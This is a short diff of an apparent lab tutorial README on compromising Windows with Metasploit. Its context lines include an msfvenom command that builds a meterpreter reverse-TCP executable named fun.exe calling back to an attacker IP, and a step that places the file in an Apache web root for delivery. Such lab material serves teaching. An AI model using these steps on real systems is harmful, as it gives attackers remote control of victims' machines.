@@ -1,5 +1,4 @@
-![image](https://github.com/user-attachments/assets/cd8a576f-0e54-4518-8052-bc002cc28630)# Compromising-windows-using-Metasploit
-Compromising windows using Metasploit
+
 # Metasploit
 Compromising windows using Metasploit
 
@@ -30,7 +29,8 @@ Find the attackers ip address using ifconfig
 Create a malicious executable file fun.exe using msenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 #### OUTPUT!
-[Uploading image.png…]()
+![image](https://github.com/user-attachments/assets/cd8a576f-0e54-4518-8052-bc002cc28630)
+
 
 
 copy the fun.exe into the apache /var/www/html folder
